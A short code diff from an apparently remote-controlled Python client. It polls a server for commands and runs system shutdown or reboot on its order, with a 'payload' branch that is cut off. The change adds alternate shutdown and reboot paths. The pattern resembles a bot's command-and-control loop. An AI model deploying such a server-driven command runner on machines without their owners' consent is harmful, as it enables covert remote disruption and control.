@@ -25,9 +25,11 @@ PAYLOAD_URL = SERVER_IP + PAYLOAD_ENDPOINT + ARGUMENT_URL
 RESPONSE_COMMAND = requests.get(STATUS_URL)
 
 if(RESPONSE_COMMAND.text=='shutdown'):
+	os.system("/sbin/shutdown -h now")
 	os.system("/usr/sbin/shutdown -h now")
 
 if(RESPONSE_COMMAND.text=='reboot'):
+	os.system("/sbin/reboot")
 	os.system("/usr/sbin/reboot")
 
 if(RESPONSE_COMMAND.text=='payload'):
